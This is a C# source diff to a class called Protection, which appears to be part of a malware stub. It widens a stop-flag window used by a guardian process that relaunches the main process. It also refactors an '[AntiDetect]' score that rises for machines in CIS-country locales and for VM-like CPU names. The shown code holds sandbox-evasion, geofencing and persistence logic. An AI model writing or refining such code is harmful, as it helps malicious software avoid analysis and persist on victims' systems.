@@ -683,16 +683,16 @@ internal static partial class Protection
         try { if (File.Exists(StopFlagPath)) File.Delete(StopFlagPath); } catch { }
     }
 
-    // Returns true if a stop flag exists that was written within the last 3 seconds.
-    // 3 s is enough to block a guardian-relaunched main process; after that the user
-    // can freely re-run the same exe and it will reconnect normally.
+    // Returns true if a stop flag exists that was written within the last 10 seconds.
+    // 10 s (vs 3 s) tolerates slow disks and heavily loaded systems where WriteAllText
+    // may not flush before the guardian reads LastWriteTimeUtc.
     public static bool IsRecentStopFlag()
     {
         try
         {
             string p = StopFlagPath;
             if (!File.Exists(p)) return false;
-            return (DateTime.UtcNow - File.GetLastWriteTimeUtc(p)).TotalSeconds < 3;
+            return (DateTime.UtcNow - File.GetLastWriteTimeUtc(p)).TotalSeconds < 10;
         }
         catch { return false; }
     }
@@ -1356,26 +1356,12 @@ internal static partial class Protection
             }
         }
 
-        // Blacklisted region — read from registry (works with InvariantGlobalization=true)
-        try
+        // Blacklisted region — reuse IsCisCountry() to avoid reading the registry twice
+        if (IsCisCountry())
         {
-            // HKCU\Control Panel\International → LocaleName = "ru-RU", "en-US", etc.
-            using var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Control Panel\International");
-            var locale = key?.GetValue("LocaleName")?.ToString() ?? "";
-            // Use LastIndexOf so "az-Latn-AZ" → "AZ", not "Latn-AZ"
-            var dash = locale.LastIndexOf('-');
-            var code = (dash >= 0 ? locale[(dash + 1)..] : locale).ToUpperInvariant();
-            foreach (var c in BlacklistedCountries)
-            {
-                if (code == c)
-                {
-                    score += 3;
-                    StubLog.Info($"[AntiDetect] Blacklisted region: {code} (+3, total={score})");
-                    break;
-                }
-            }
+            score += 3;
+            StubLog.Info($"[AntiDetect] Blacklisted region (+3, total={score})");
         }
-        catch { }
 
         // Generic/broadcast CPU name — VMs that don't pass real CPU info
         try
